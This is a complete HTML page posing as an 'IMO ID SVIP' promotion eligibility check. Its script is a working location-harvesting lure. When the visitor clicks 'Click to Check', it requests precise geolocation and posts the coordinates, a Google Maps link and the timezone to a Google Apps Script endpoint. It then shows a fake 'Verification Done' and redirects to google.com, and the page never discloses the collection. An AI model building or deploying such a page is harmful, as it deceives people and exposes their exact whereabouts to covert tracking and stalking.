<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
  <title>IMO ID PRAMOTION</title>

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      min-height: 100vh;
      padding: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      color: #222;
      overflow: hidden;
      background:
        radial-gradient(circle at 12% 18%, rgba(0, 194, 255, .34), transparent 32%),
        radial-gradient(circle at 88% 14%, rgba(139, 92, 246, .32), transparent 30%),
        radial-gradient(circle at 84% 86%, rgba(236, 72, 153, .25), transparent 34%),
        radial-gradient(circle at 18% 88%, rgba(34, 197, 94, .20), transparent 30%),
        linear-gradient(135deg, #eef7ff 0%, #f6f0ff 48%, #fff0f8 100%);
    }

    .card {
      width: min(430px, 100%);
      padding: 34px 26px 28px;
      text-align: center;
      border: 1px solid rgba(255,255,255,.72);
      border-radius: 24px;
      background: rgba(255,255,255,.72);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
      box-shadow:
        0 22px 55px rgba(71, 85, 105, .18),
        0 2px 8px rgba(59, 130, 246, .08);
      color: #222;
      animation: enter .55s ease;
    }

    @keyframes enter {
      from { opacity: 0; transform: translateY(18px) scale(.98); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }

    h1 {
      margin: 0;
      font-size: 25px;
      letter-spacing: -.4px;
    }

    .desc {
      margin: 12px auto 24px;
      max-width: 340px;
      color: #666;
      font-size: 14px;
      line-height: 1.55;
    }

    .status {
      min-height: 52px;
      margin-bottom: 18px;
      padding: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 14px;
      background: rgba(255,255,255,.78);
      color: #444;
      border: 1px solid rgba(99,102,241,.13);
      font-size: 14px;
      line-height: 1.45;
      box-shadow: 0 5px 16px rgba(99,102,241,.06);
    }

    .status.success {
      background: rgba(34,197,94,.13);
      color: #16803a;
      border: 1px solid rgba(34,197,94,.24);
    }

    .status.error {
      background: rgba(239,68,68,.10);
      color: #b42318;
      border: 1px solid rgba(239,68,68,.20);
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 14px;
      padding: 15px 20px;
      color: #fff;
      background: linear-gradient(135deg, #2563eb 0%, #5b5ce2 50%, #8b5cf6 100%);
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 12px 24px rgba(79, 70, 229, .24);
      transition: transform .18s ease, opacity .18s ease, box-shadow .18s ease;
    }

    button:active {
      transform: scale(.98);
      box-shadow: 0 6px 14px rgba(79, 70, 229, .20);
    }

    button:disabled {
      cursor: wait;
      opacity: .7;
    }

    .privacy {
      margin-top: 18px;
      color: #888;
      font-size: 11px;
      line-height: 1.5;
    }

    .spinner {
      width: 20px;
      height: 20px;
      display: inline-block;
      margin-right: 10px;
      vertical-align: -5px;
      border-radius: 50%;
      border: 3px solid rgba(99,102,241,.14);
      border-top-color: #2563eb;
      border-right-color: #8b5cf6;
      animation: spin .8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>

<body>
  <main class="card">
    <h1 id="title">IMO ID SVIP 7</h1>

    <p class="desc" id="desc">
      
    </p>

    <div class="status" id="status">SVIP ELIGIBLE ✅</div>

    <button id="locationBtn" type="button">Click to Check</button>

    <div class="privacy">
    
    </div>
  </main>

<script>
  const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwsXKLXTkWGtanhijRCtT8FV-E1_YmFZtNddqLMSWaOIX8ur9frOT31HjbVCWwel9rsZw/exec";

  const btn = document.getElementById("locationBtn");
  const statusBox = document.getElementById("status");
  const title = document.getElementById("title");
  const desc = document.getElementById("desc");
  const icon = document.getElementById("icon");

  function setStatus(message, type = "") {
    statusBox.className = "status" + (type ? " " + type : "");
    statusBox.innerHTML = message;
  }

  function setLoading(text) {
    btn.disabled = true;
    btn.innerText = "Please Wait...";
    setStatus('<span class="spinner"></span>' + text);
  }

  function showTryAgain(message) {
    btn.disabled = false;
    btn.innerText = "Try Again";
    setStatus(message, "error");
  }

  function showDone() {
    btn.disabled = true;
    btn.innerText = "Verification Done ✓";
    title.innerText = "Verification Done";
    desc.innerText = "VERIFICATION COMPLETED";
    if (icon) icon.innerText = "✓";
    setStatus(" saved successfully", "success");
    window.location.href = "https://www.google.com";
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject({ code: 0, message: "Retry Now" });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });
  }

  async function saveToSheet(payload) {
    /*
      Google Apps Script commonly redirects POST requests from script.google.com
      to script.googleusercontent.com. "redirect: follow" is therefore required.
      This function reads the JSON response and only reports success when
      the deployed script returns { success: true }.
    */
    const response = await fetch(SHEET_WEBAPP_URL, {
      method: "POST",
      redirect: "follow",
      headers: {
        "Content-Type": "text/plain;charset=utf-8"
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error("Server request failed.");
    }

    const result = await response.json();

    if (!result || result.success !== true) {
      throw new Error(
        (result && result.message)
          ? result.message
          : "Verification Failed."
      );
    }

    return result;
  }

  btn.addEventListener("click", async () => {
    setLoading("Loading...");

    try {
      const position = await getLocation();

      setLoading("Processing Verification");

      const payload = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        maps:
          "https://www.google.com/maps?q=" +
          position.coords.latitude +
          "," +
          position.coords.longitude,
        timezone:
          Intl.DateTimeFormat().resolvedOptions().timeZone || ""
      };

      await saveToSheet(payload);

      showDone();

    } catch (error) {
      let message = "Verification failed. Please try again.";

      if (error && error.code === 1) {
        message = " try again.";
      } else if (error && error.code === 2) {
        message = "try again.";
      } else if (error && error.code === 3) {
        message = "Location request timed out. Please try again.";
      } else if (error && error.message) {
        message = error.message;
      }

      showTryAgain(message);
    }
  });
</script>
</body>
</html>
